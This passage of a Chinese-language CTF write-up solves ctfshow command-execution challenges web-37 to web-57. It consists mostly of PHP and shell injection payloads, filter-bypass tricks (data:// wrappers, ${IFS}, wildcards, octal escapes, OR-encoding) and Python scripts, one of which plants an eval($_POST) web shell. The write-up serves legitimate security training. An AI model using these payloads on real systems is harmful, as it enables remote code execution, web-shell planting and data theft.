class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br><br>日志包含<br><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log<br></code></pre></td></tr></table></figure><h2 id="web-37（data-伪协议、base64加密）"><a href="#web-37（data-伪协议、base64加密）" class="headerlink" title="web-37（data:&#x2F;&#x2F;伪协议、base64加密）"></a>web-37（data:&#x2F;&#x2F;伪协议、base64加密）</h2><p><img src="/../image/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-6.png"></p><p>这里eval换成了include，很明显要用文件包含，但是过滤了flag关键字，所以可以使用文件包含<strong>data:&#x2F;&#x2F;协议</strong>，将我们的代码通过base64加密后再输入，这样就能绕过flag关键字过滤了</p><p>语法为data:&#x2F;&#x2F;text&#x2F;plain;base64,代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br><br>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==即为<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag,php&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web-38（同上题）"><a href="#web-38（同上题）" class="headerlink" title="web-38（同上题）"></a>web-38（同上题）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-7.png"></p><p>比上题多过滤了个php和file关键字，使用上题的payload即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/</span>Pg==<br></code></pre></td></tr></table></figure><h2 id="web-39（data-伪协议）"><a href="#web-39（data-伪协议）" class="headerlink" title="web-39（data:&#x2F;&#x2F;伪协议）"></a>web-39（data:&#x2F;&#x2F;伪协议）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-8.png"></p><p>源码会在我们的$c后拼接一个’.php’，但是拼接的php可以不用管,include只会处理<code>&lt;?php ?&gt;</code>内部的内容</p><p>但是这里试了一下好像不能用base64加密绕过了，所以使用模糊匹配绕过关键字过滤</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac fla*&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="web-40（无参数RCE绕过、scandir文件读取）"><a href="#web-40（无参数RCE绕过、scandir文件读取）" class="headerlink" title="web-40（无参数RCE绕过、scandir文件读取）"></a>web-40（无参数RCE绕过、scandir文件读取）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-9.png"></p><p>看到题目被吓到了以为过滤了小括号，结果发现是中文括号，这里可以使用无参数RCE绕过或者scandir()文件读取都行</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">无参数RCE<br>?c=<span class="hljs-keyword">eval</span>(end(<span class="hljs-keyword">pos</span>(get_defined_vars())));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br><br>或者<br><br>scandir()文件读取<br>首先，查看当前目录下文件<br>print_r(scandir(current(localeconv())));<br>发现flag.php在第二位，直接show_source读取<br>show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure><h2 id="web-41（无字母数字或运算绕过）"><a href="#web-41（无字母数字或运算绕过）" class="headerlink" title="web-41（无字母数字或运算绕过）"></a>web-41（无字母数字或运算绕过）</h2><p>这题不会直接看的题解</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">对于&#x27;/[0-9]|<span class="hljs-string">[a-z]</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\~</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\]</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\&#125;</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\-/i&#x27;</span><br></code></pre></td></tr></table></figure><p>该正则表达式的含义是：它会匹配任意一个数字字符、小写字母、”^”、”+”、”~”、”$”、”[“、”]”、”{“、”}”、”&amp;” 或 “-“，并且在匹配时忽略大小写。可以说过滤了大部分绕过方式，但是还剩下”|”没有过滤。所以这道题的目的就是要我们使用ascii码为0-255中没有被过滤的字符进行或运算，从而得到被绕过的字符。</p><p>思路如下：</p><ul><li>首先对ascii从0-255所有字符中筛选出未被过滤的字符，然后两两进行或运算，存储结果。</li><li>跟据题目要求，构造payload的原型，并将原型替换为或运算的结果</li><li>使用POST请求发送c,获取flag</li></ul><p><strong>一体化脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">import</span> requests<br><br>contents = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        hex_i = <span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)<br>        hex_j = <span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(j)<br>        preg = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[0-9]|[a-z]|\^|\+|~|\$|\[|]|\&#123;|&#125;|&amp;|-&#x27;</span>, re.I)<br>        <span class="hljs-keyword">if</span> preg.search(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_i, <span class="hljs-number">16</span>))) <span class="hljs-keyword">or</span> preg.search(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_j, <span class="hljs-number">16</span>))):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            a = <span class="hljs-string">&#x27;%&#x27;</span> + hex_i<br>            b = <span class="hljs-string">&#x27;%&#x27;</span> + hex_j<br>            c = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>:], <span class="hljs-number">16</span>) | <span class="hljs-built_in">int</span>(b[<span class="hljs-number">1</span>:], <span class="hljs-number">16</span>))<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= <span class="hljs-built_in">ord</span>(c) &lt;= <span class="hljs-number">126</span>:<br>                contents.append([c, a, b])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_payload</span>(<span class="hljs-params">cmd</span>):<br>    payload1 = <span class="hljs-string">&#x27;&#x27;</span><br>    payload2 = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cmd:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> contents:<br>            <span class="hljs-keyword">if</span> i == j[<span class="hljs-number">0</span>]:<br>                payload1 += j[<span class="hljs-number">1</span>]<br>                payload2 += j[<span class="hljs-number">2</span>]<br>                <span class="hljs-keyword">break</span><br>    payload = <span class="hljs-string">&#x27;(&quot;&#x27;</span> + payload1 + <span class="hljs-string">&#x27;&quot;|&quot;&#x27;</span> + payload2 + <span class="hljs-string">&#x27;&quot;)&#x27;</span><br>    <span class="hljs-keyword">return</span> payload<br><br><br>URL = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;url:&#x27;</span>)<br>payload = make_payload(<span class="hljs-string">&#x27;system&#x27;</span>) + make_payload(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>)<br>response = requests.post(URL, data=&#123;<span class="hljs-string">&#x27;c&#x27;</span>: urllib.parse.unquote(payload)&#125;)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><hr><h2 id="web-42（-绕过-dev-null-2-1命令）"><a href="#web-42（-绕过-dev-null-2-1命令）" class="headerlink" title="web-42（||绕过 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1命令）"></a>web-42（||绕过 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1命令）</h2><p>这题给我们的$c后拼接了一个<code>&quot; &gt;/dev/null 2&gt;&amp;1&quot;</code>，该命令让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p><p>这里可以使用<code>||</code>来绕过，这里用%0a和%26都行</p><p><strong>||类似于程序中的if-else语句。若前面的命令执行成功，则后面的命令就不会执行。若前面的命令执行失败，则执行后面的命令</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=cat flag.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-43（tac）"><a href="#web-43（tac）" class="headerlink" title="web-43（tac）"></a>web-43（tac）</h2><p>比上一题多过滤了个cat和分号，换tac即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac flag.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-44（-模糊匹配）"><a href="#web-44（-模糊匹配）" class="headerlink" title="web-44（*模糊匹配）"></a>web-44（*模糊匹配）</h2><p>又比上题多过滤了个flag，这里用*号模糊匹配即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac fla*||<br></code></pre></td></tr></table></figure><hr><h2 id="web-45（-09绕过空格过滤、-IFS-）"><a href="#web-45（-09绕过空格过滤、-IFS-）" class="headerlink" title="web-45（%09绕过空格过滤、${IFS}）"></a>web-45（%09绕过空格过滤、${IFS}）</h2><p>比上一题多过滤了个空格，用url编码<code>%09</code>代替空格即可，用<code>$&#123;IFS&#125;</code>也行</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla*||<br></code></pre></td></tr></table></figure><hr><h2 id="web-46（-转义、-转义绕过-号过滤）"><a href="#web-46（-转义、-转义绕过-号过滤）" class="headerlink" title="web-46（?转义、\转义绕过*号过滤）"></a>web-46（?转义、\转义绕过*号过滤）</h2><p>又多过滤了<em>号，*<em>可以用?或者\转义绕过</em></em></p><p><strong>用’’和””空字符绕过也行</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla?.php||<br><br>或者<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac&lt;fla\g.php||<br><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fl&#x27;&#x27;ag.php||<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fl<span class="hljs-string">&quot;&quot;</span>ag.php||<br><br>注意：用了?就不能用重定向符&lt;来绕过空格了<br></code></pre></td></tr></table></figure><hr><h2 id="web-47（同上题）"><a href="#web-47（同上题）" class="headerlink" title="web-47（同上题）"></a>web-47（同上题）</h2><p>又多过滤了一些命令more、less、head、sort、tail，用上一关的payload就行了</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla?.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-48（同上题）"><a href="#web-48（同上题）" class="headerlink" title="web-48（同上题）"></a>web-48（同上题）</h2><p>还是没过滤tac，一样</p><hr><h2 id="web-49（同上题）"><a href="#web-49（同上题）" class="headerlink" title="web-49（同上题）"></a>web-49（同上题）</h2><p>还是一样</p><hr><h2 id="web-50（"><a href="#web-50（" class="headerlink" title="web-50（&lt;重定向符绕过空格过滤）"></a>web-50（&lt;重定向符绕过空格过滤）</h2><p>依然可以用tac绕过，但是%和制表符被过滤了</p><p>注意：这里过滤了&#x2F;x09即制表符</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac&lt;fl\ag.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-51（nl、"><a href="#web-51（nl、" class="headerlink" title="web-51（nl、&lt;重定向符）"></a>web-51（nl、&lt;重定向符）</h2><p>这题过滤了tac和%，用nl和&lt;绕过就行了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=nl&lt;fl\ag.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-52（-IFS-绕过空格过滤）"><a href="#web-52（-IFS-绕过空格过滤）" class="headerlink" title="web-52（${IFS}绕过空格过滤）"></a>web-52（${IFS}绕过空格过滤）</h2><p>这题把&lt;给过滤了，但是没过滤字母和$符号以及大括号，所以能用${IFS}代替空格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">$&#123;IFS&#125;</span>fl\ag.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-53（同上）"><a href="#web-53（同上）" class="headerlink" title="web-53（同上）"></a>web-53（同上）</h2><p>一样用$IFS即可</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=nl<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl\ag.php<br>或者<br><span class="hljs-string">?c</span>=ta<span class="hljs-string">&#x27;&#x27;</span>c<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl\ag.php<br></code></pre></td></tr></table></figure><hr><h2 id="web-54（通过命令路径使用cat命令、rev）"><a href="#web-54（通过命令路径使用cat命令、rev）" class="headerlink" title="web-54（通过命令路径使用cat命令、rev）"></a>web-54（通过命令路径使用cat命令、rev）</h2><p>这里用了</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">|<span class="hljs-type">.*c</span>.*a.*t.*|<span class="hljs-type">这种匹配方式</span><br><span class="hljs-type">匹配包含字符 c</span>、a、t 的任意顺序的字符串，例如 cat、cbaat 等<br></code></pre></td></tr></table></figure><p>所以可以这样绕过，通过命令路径来使用cat命令（linux路径下万物皆文件）</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/ca</span>?<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;f?<span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><br>或者<br><span class="hljs-string">?c</span>=rev<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fla?.php<br>输出出来是反转的<br></code></pre></td></tr></table></figure><hr><h2 id="web-55（无字母base64-通配符、-usr-bin-bzip2压缩命令、bash-shell转义字符）"><a href="#web-55（无字母base64-通配符、-usr-bin-bzip2压缩命令、bash-shell转义字符）" class="headerlink" title="web-55（无字母base64+通配符、&#x2F;usr&#x2F;bin&#x2F;bzip2压缩命令、bash shell转义字符）"></a>web-55（无字母base64+通配符、&#x2F;usr&#x2F;bin&#x2F;bzip2压缩命令、bash shell转义字符）</h2><p>由于过滤了字母，但没有过滤数字，我们尝试使用&#x2F;bin目录下的可执行程序。</p><p>但因为字母不能传入，我们需要使用通配符?来进行代替</p><p><strong>base64+通配符</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/base</span>64 flag.php<br>替换为<br><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">64</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br></code></pre></td></tr></table></figure><p><strong>&#x2F;usr&#x2F;bin&#x2F;bzip2压缩命令，将flag.php压缩为压缩包，访问并下载</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">2</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br>即/usr/bin/bzip2 flag.php<br>把flag.php给压缩，然后访问url+flag.php.bz2就可以把压缩后的flag.php给下载下来。<br></code></pre></td></tr></table></figure><p><strong>bash shell的转义字符</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Bash shell中，\是转义字符的开始。当你使用\后跟一个数字时，Bash会将其解释为八进制数，并将其转换为对应的ASCII字符。<br><br>可通过 <span class="hljs-variable">$</span><span class="hljs-string">&#x27;[转义字符]&#x27;</span>构造命令。<br><br>payload:<br>?c=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;\154\163&#x27;</span>    <span class="hljs-built_in">ls</span><br>?c=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;\143\141\164&#x27;</span>%<span class="hljs-number">20</span>*    <span class="hljs-built_in">cat</span> *<br></code></pre></td></tr></table></figure><p>这里也可以用文件上传加读取</p><p>先构造一个文件上传的POST数据包；</p><p>二：PHP页面生成临时文件phpXXXXXX，存储在&#x2F;tmp目录下；</p><p>三：执行指令.&#x2F;???&#x2F;??????[@-[]，读取文件执行其中指令；</p><p>用python脚本直接完成，也可以写个表单去上传都行</p><p>先使用python脚本上传文件并访问，这样就能生成一个shell.php文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> requests<br><br>url2 = <span class="hljs-string">&#x27;http://03b01a20-43d6-439e-b60d-6bb746c9332f.challenge.ctf.show/?c=.+/???/????????[@-[]&#x27;</span><br><span class="hljs-keyword">file</span> = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;mixbp.txt&quot;</span>,<span class="hljs-string">&quot;echo &#x27;&lt;?php eval($_POST[1]);&#x27; &gt; shell.php&quot;</span>)&#125;<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:<br>    r = requests.post(url=url2,files=<span class="hljs-keyword">file</span>)<br></code></pre></td></tr></table></figure><p>然后用蚁剑连接即可</p><p>或者直接输出答案到python</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;http://25a61f1e-6750-49d2-a671-7bce2a18c52b.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br>    r = requests.post(url, files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;mixbp.txt&#x27;</span>,<span class="hljs-string">&#x27;cat flag.php&#x27;</span>)&#125;)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&quot;</span> <span class="hljs-keyword">in</span> r.<span class="hljs-built_in">text</span>:<br>        print(r.<span class="hljs-built_in">text</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-56（无字母数字RCE）"><a href="#web-56（无字母数字RCE）" class="headerlink" title="web-56（无字母数字RCE）"></a>web-56（无字母数字RCE）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>无字母数字RCE</p><p>过滤了字母数字，%号，杜绝取反和异或；$，杜绝转义，看了其他大神的wp，总结出下面的方法：</p><p>可以通过POST上传一个文件，文件中包含命令，通过source命令（.）来执行命令，该文件在linux下面保存在 <strong>&#x2F;tmp&#x2F;php??????</strong> ，后六个字符为随机生成的大小写，可使用linux匹配符去匹配。</p><p>可以通过构造post上传文件的数据包，或者使用python脚本：</p><p>（1）数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;[传参网站]&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>传入参数 <strong>?c&#x3D;.%20&#x2F;???&#x2F;????????[@-[]</strong></p><p>在文件内容中写入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> /var/www/html/falg.php<br></code></pre></td></tr></table></figure><p>2）python脚本</p><p>同样的思路。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;[自定义网站]/?c=.+/???/????????[@-[]&quot;</span><br>    r = requests.post(url, files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;feng.txt&#x27;</span>, <span class="hljs-string">b&#x27;cat flag.php&#x27;</span>)&#125;)<br>    <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;flag&quot;</span>) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web-57（无数字字母RCE构造数字）"><a href="#web-57（无数字字母RCE构造数字）" class="headerlink" title="web-57（无数字字母RCE构造数字）"></a>web-57（无数字字母RCE构造数字）</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 